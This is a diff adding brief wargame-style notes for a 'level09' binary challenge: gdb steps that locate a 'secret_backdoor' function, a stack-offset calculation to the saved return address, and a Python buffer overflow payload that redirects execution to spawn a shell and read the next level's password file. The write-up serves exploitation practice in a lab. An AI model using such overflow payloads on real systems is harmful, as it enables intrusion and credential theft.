@@ -1,0 +1,29 @@
+
+secret_backdoor 
+break main 
+r
+info address secret_backdoor 0x55555555488c
+
+
+Calcul RIP
+
+[ text (140) ]
+[ username (40) ]
+[ len (4) ]
+-----------------
+= 184 bytes
+[ saved RBP (8) ] → 192
+[ saved RIP (8) ] → 200
+
+
+Exploit
+python << 'EOF' > /tmp/exploit
+# Username: overflow len
+print('A' * 40 + '\xd4')
+# Message: padding + address + command
+print('B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh')
+EOF
+
+cat /tmp/exploit - | ./level09
+
+cat /home/users/end/.pass
